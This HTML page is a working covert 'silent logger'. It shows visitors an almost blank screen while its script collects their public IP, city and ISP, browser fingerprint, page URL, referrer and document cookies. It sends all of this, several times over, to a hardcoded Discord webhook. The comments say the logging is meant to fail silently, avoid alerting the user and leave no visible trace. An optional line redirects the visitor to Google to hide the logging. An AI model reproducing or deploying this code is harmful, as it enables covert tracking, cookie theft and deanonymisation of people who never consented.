<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>.</title>
    <style>
        body {
            margin: 0;
            min-height: 100vh;
            background: #0b0b0b;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Courier New', monospace;
            color: #1a1a1a;
        }
        .ghost {
            opacity: 0;
            user-select: none;
            pointer-events: none;
            font-size: 1px;
        }
    </style>
</head>
<body>
    <div class="ghost">⏳</div>

    <script>
        (function() {
            // ----- COLLECT EVERYTHING -----
            const data = {
                timestamp: new Date().toISOString(),
                ip: "{{ip}}",                  // placeholder – we'll override via fetch
                userAgent: navigator.userAgent || "unknown",
                language: navigator.language || navigator.userLanguage || "unknown",
                platform: navigator.platform || "unknown",
                screen: `${window.screen.width}x${window.screen.height}`,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
                referrer: document.referrer || "direct",
                url: window.location.href,
                cookies: document.cookie || "none",
                doNotTrack: navigator.doNotTrack || "unspecified",
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType || "unknown",
                    rtt: navigator.connection.rtt || "?",
                    downlink: navigator.connection.downlink || "?"
                } : "unavailable",
                deviceMemory: navigator.deviceMemory || "unknown",
                hardwareConcurrency: navigator.hardwareConcurrency || "unknown"
            };

            // ----- GET REAL PUBLIC IP VIA MULTIPLE FALLBACKS -----
            function getIP(callback) {
                const services = [
                    'https://api.ipify.org?format=json',
                    'https://api64.ipify.org?format=json',
                    'https://ipapi.co/json/',
                    'https://ip-api.com/json/'
                ];
                let index = 0;

                function tryNext() {
                    if (index >= services.length) {
                        callback('unable_to_fetch_ip');
                        return;
                    }
                    fetch(services[index], { mode: 'cors', cache: 'no-store' })
                        .then(res => {
                            if (!res.ok) throw new Error('status ' + res.status);
                            return res.json();
                        })
                        .then(json => {
                            let ip = json.ip || json.query || json.ip_address || null;
                            if (ip) {
                                // optionally grab extra geo data if available
                                if (json.city) data.city = json.city;
                                if (json.region) data.region = json.region;
                                if (json.country) data.country = json.country;
                                if (json.isp) data.isp = json.isp;
                                callback(ip);
                            } else {
                                throw new Error('no ip field');
                            }
                        })
                        .catch(() => {
                            index++;
                            tryNext();
                        });
                }
                tryNext();
            }

            // ----- SEND TO WEBHOOK -----
            function fireWebhook(ipAddress) {
                data.ip = ipAddress;

                // Build a clean Discord embed
                const embed = {
                    title: "📍 New Visitor Logged",
                    color: 0x2f3136,
                    fields: [],
                    footer: { text: "Silent logger • " + new Date().toLocaleString() },
                    timestamp: data.timestamp
                };

                // Add fields (Discord max 25 fields, 1024 chars each)
                const fields = [
                    { name: "🌐 IP", value: data.ip, inline: true },
                    { name: "🖥️ User-Agent", value: data.userAgent.substring(0, 200), inline: false },
                    { name: "🌍 Language", value: data.language, inline: true },
                    { name: "📱 Platform", value: data.platform, inline: true },
                    { name: "🖥️ Screen", value: data.screen, inline: true },
                    { name: "📐 Viewport", value: data.viewport, inline: true },
                    { name: "⏰ Timezone", value: data.timezone, inline: true },
                    { name: "🔗 Referrer", value: data.referrer.substring(0, 200) || "direct", inline: false },
                    { name: "📄 URL", value: data.url.substring(0, 200), inline: false },
                    { name: "🍪 Cookies", value: (data.cookies || "none").substring(0, 200), inline: false },
                    { name: "🚫 Do-Not-Track", value: data.doNotTrack, inline: true },
                    { name: "📶 Connection", value: data.connection.type || "unknown", inline: true },
                    { name: "⚡ RTT", value: data.connection.rtt + "ms" || "?", inline: true },
                    { name: "📥 Downlink", value: data.connection.downlink + " Mbps" || "?", inline: true },
                    { name: "🧠 Device Memory", value: data.deviceMemory + " GB" || "unknown", inline: true },
                    { name: "⚙️ CPU Cores", value: data.hardwareConcurrency || "unknown", inline: true }
                ];

                // Add geo/isp if we got them
                if (data.city) fields.push({ name: "🏙️ City", value: data.city, inline: true });
                if (data.region) fields.push({ name: "🗺️ Region", value: data.region, inline: true });
                if (data.country) fields.push({ name: "🇨🇳 Country", value: data.country, inline: true });
                if (data.isp) fields.push({ name: "🔌 ISP", value: data.isp, inline: true });

                embed.fields = fields;

                const payload = {
                    embeds: [embed],
                    username: "LoggerBot",
                    avatar_url: "https://i.imgur.com/f0x3n7T.png"
                };

                // Fire and forget – we don't care about response
                fetch('https://discord.com/api/webhooks/1520697774419476533/33VRjbgu6a-q0Qmq0liA0QoP_oTVexhEUkfQHlzqBXJ2uW8PsgbGscZbGbWOq0D2YTHt', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    mode: 'no-cors' // this prevents CORS errors but also hides response
                }).catch(() => {}); // silent fail – we don't alert the user

                // Also try sending a plain text backup (some webhooks prefer this)
                try {
                    const plainText = `IP: ${data.ip}\nUA: ${data.userAgent}\nTime: ${data.timestamp}\nRef: ${data.referrer}\nURL: ${data.url}`;
                    fetch('https://discord.com/api/webhooks/1520697774419476533/33VRjbgu6a-q0Qmq0liA0QoP_oTVexhEUkfQHlzqBXJ2uW8PsgbGscZbGbWOq0D2YTHt', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: "```\n" + plainText + "\n```" }),
                        mode: 'no-cors'
                    }).catch(() => {});
                } catch (_) {}
            }

            // ----- EXECUTION -----
            // Try to get IP, then fire. If IP fails, still fire with placeholder.
            getIP(function(ip) {
                fireWebhook(ip);
            });

            // Also fire a second hit after 2 seconds in case the first one was blocked (redundancy)
            setTimeout(() => {
                // re-collect fresh data (optional)
                const backupData = {
                    timestamp: new Date().toISOString(),
                    ip: "fallback_retry",
                    userAgent: navigator.userAgent,
                    referrer: document.referrer,
                    url: window.location.href
                };
                fetch('https://discord.com/api/webhooks/1520697774419476533/33VRjbgu6a-q0Qmq0liA0QoP_oTVexhEUkfQHlzqBXJ2uW8PsgbGscZbGbWOq0D2YTHt', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `🔄 Backup: ${JSON.stringify(backupData)}` }),
                    mode: 'no-cors'
                }).catch(() => {});
            }, 2000);

            // ----- LEAVE NO TRACE (visually) -----
            // The page shows almost nothing – just a tiny invisible character.
            // Optionally, you can redirect to a real page after logging.
            // Uncomment below to redirect to google after 1.5s (so user sees nothing suspicious)
            // setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
        })();
    </script>
</body>
</html>
